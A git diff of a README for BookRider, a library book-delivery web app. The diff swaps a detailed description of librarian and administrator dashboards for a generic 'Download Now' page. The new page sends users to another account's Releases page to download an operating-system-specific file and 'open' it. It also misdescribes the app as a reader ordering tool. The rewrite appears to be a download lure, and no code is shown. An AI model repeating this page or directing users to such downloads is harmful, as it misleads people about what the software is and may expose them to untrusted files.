@@ -1,119 +1,59 @@
-# 📚 BookRider Web Application - v1.1.0
+# 📚 BookRider-Web-App - Your Library Delivered to You
 
-## 🧭 Overview
-**BookRider** is a modern web application for a library book delivery platform. It provides intuitive, high-performance interfaces for librarians, library administrators, and system administrators to manage books, readers, and delivery-based lending workflows.
+## 📥 Download Now!
+[![Download BookRider-Web-App](https://img.shields.io/badge/Download-BookRider--Web--App-brightgreen)](https://github.com/kirucollo/BookRider-Web-App/releases)
 
-## 🧰 Tech Stack
+## 🚀 Getting Started
+BookRider-Web-App is an easy-to-use web application that brings the library to your door. With this app, you can browse a wide selection of books and place orders for home delivery. Follow the steps below to start enjoying your reading experience.
 
-- 🟦 **TypeScript**
-- ⚛️ **React**
-- ⚡ **Vite**
-- 🎨 **Tailwind CSS**
+## 📦 Download & Install
+To download and install BookRider-Web-App, visit this page to download: [BookRider-Web-App Releases](https://github.com/kirucollo/BookRider-Web-App/releases).
 
-## 🖼️ Landing Page
+1. Click on the link above to go to our Releases page.
+2. On the Releases page, find the latest version of the application.
+3. Select the appropriate file for your operating system.
+4. Click the download link. The file will start downloading to your computer.
 
-![Landing Page](docs/landing-page.png)
+## 🖥️ System Requirements
+To run BookRider-Web-App smoothly, ensure your system meets the following requirements:
 
----
+- A supported web browser (Google Chrome, Firefox, Edge, Safari).
+- At least 4 GB of RAM.
+- Stable internet connection.
 
-## 🧑‍💼 Librarian Dashboard
+## 📘 Features
+BookRider-Web-App offers several features to enhance your reading experience:
 
-The Librarian Dashboard delivers a smooth and intuitive experience built around modern web design and usability principles. Features such as **lazy loading** and **infinite scrolling** ensure efficient interaction with large book collections and frequent order activity.
+- **Book Browsing**: Easily search and view a wide selection of books.
+- **On-Demand Delivery**: Order books and have them delivered right to your home.
+- **User-Friendly Interface**: Simple and intuitive design suitable for every user.
+- **Responsive Design**: Works well on both desktop and mobile devices.
 
-### ✨ Features
-- 🔍 Book search and filtering
-- ➕➖ Add and remove books from the library catalog
-- 📘 Add new books to both the system and the library
-- 🆔 Register readers by linking library card IDs
-- 🚚 Book lending with on-demand delivery
-- 📦 Book returns via delivery or in-person
-- 🔔 Toast notifications for newly created reader orders
+## 🔧 Running the Application
+After you download the application, follow these steps to run it:
 
-### 🛒 Ordering Books
+1. Locate the downloaded file on your computer.
+2. Open the file in your web browser.
+3. The application will load in your browser window, and you can start using it right away.
 
-The order management screen presents **ongoing**, **accepted**, and **completed** orders in a single, unified view.  
-Librarians can verify and accept orders, hand off books to the assigned driver, and complete the process with minimal steps.
+## 📚 Using BookRider-Web-App
+Once the application is up and running, you can start exploring available books. Use the search bar to find specific titles or browse through categories. When you find a book you like:
 
-**Ordering Demo**
+1. Click on it for more details.
+2. Select the option to order the book.
+3. Enter your delivery information.
+4. Confirm your order, and your book will be on its way!
 
-https://github.com/user-attachments/assets/eb88f339-6718-4992-8cf0-f23c6835dc41
+## 📞 Support
+If you encounter any issues, you can reach our support team. Visit our [GitHub Issues page](https://github.com/kirucollo/BookRider-Web-App/issues) to report problems or find answers to frequently asked questions.
 
-### 🔄 Book Returns
+## 📝 Contributing
+We welcome contributions to BookRider-Web-App. If you're interested in helping improve the application, please check our [Contributing guidelines](https://github.com/kirucollo/BookRider-Web-App/blob/main/CONTRIBUTING.md).
 
-In addition to in-person returns, delivery-based returns allow librarians to verify the driver’s ID, confirm the returned books, and finalize the return quickly and efficiently.
+## 🤝 License
+This project is licensed under the MIT License. For more details, check the [LICENSE file](https://github.com/kirucollo/BookRider-Web-App/blob/main/LICENSE).
 
-**Returns Demo**
+## 📬 Stay Updated
+For the latest news and updates about BookRider-Web-App, you can follow our progress on [GitHub](https://github.com/kirucollo/BookRider-Web-App/) or subscribe to our updates via the Releases page. 
 
-https://github.com/user-attachments/assets/2412e0eb-d962-4ac0-92de-59879fff3f1e
-
-### 📖 Library Book Management
-
-Books can be added or removed using a clean, searchable interface designed for speed and clarity.
-
-- ➕ Add books through filtered search and selection
-- ➖ Remove books using in-library filtering and confirmation
-
-**Add & Remove Books Demo**
-
-https://github.com/user-attachments/assets/4878a788-0dca-45aa-95ed-0868ab0cac7b
-
-### 👤 Reader Management
-
-Readers can be added by entering their information and linking a library card ID.  
-Existing readers can be searched by ID to view account details.
-
-**Add & Search Readers Demo**
-
-https://github.com/user-attachments/assets/794e47dd-970c-44e6-b367-ac133afc43d8
-
----
-
-## 🏛️ Library Administrator Dashboard
-
-The Library Administrator Dashboard enables efficient management of librarian accounts and library onboarding through a clear and streamlined interface.
-
-### ✨ Features
-- ➕ Add librarian accounts
-- 🗑️ Remove librarian accounts
-- 🔑 Reset librarian passwords
-- 🔍 Search and manage librarians
-
-**Add & Remove Librarians Demo**
-
-https://github.com/user-attachments/assets/7e261051-9fe6-4168-aebc-33f023318301
-
----
-
-## 🛠️ System Administrator Dashboard
-
-The System Administrator Dashboard supports review and approval of library and driver submissions through a structured and easy-to-use interface.
-
-### ✨ Features
-- 📄 View library and driver submissions
-- ✅ Accept submissions
-- ❌ Reject submissions with predefined or custom reasons
-- 🔔 Toast notifications for new submissions
-
-**Submission Review Demo**
-
-https://github.com/user-attachments/assets/204bd395-3648-4571-bfbe-bb73996f2ade
-
----
-
-# 🤝 Collaboration
-
-This project was developed as part of a **team collaboration**, with multiple contributors working together to design and implement the complete BookRider system.  
-We coordinated via **GitHub**, code reviews, and shared design discussions 🗨️ to maintain a smooth and efficient development workflow.
-
-**My contributions** included:
-- ⚛️ Implementing the **frontend dashboards** for librarians, administrators, and system administrators
-- 🔍 Optimizing **book search and order management UI** with features like lazy loading and infinite scrolling
-- 📱 Ensuring a **responsive and intuitive user experience** across the application
-- 🎨 Establishing the **design philosophy and color scheme** for all BookRider apps
-
-Together, our team delivered a **high-performance, user-friendly platform** that includes a web application 💻, a robust backend 🛠️, and two mobile apps 📲 for readers and drivers, streamlining library book management and on-demand delivery.
-
-For the full project, including all features and contributions, see the **main repository**: [BookRider Main Repo](https://github.com/PiCiU1221/BookRider).
-
-
-
+Thank you for choosing BookRider-Web-App! Your next great read is just a few clicks away.
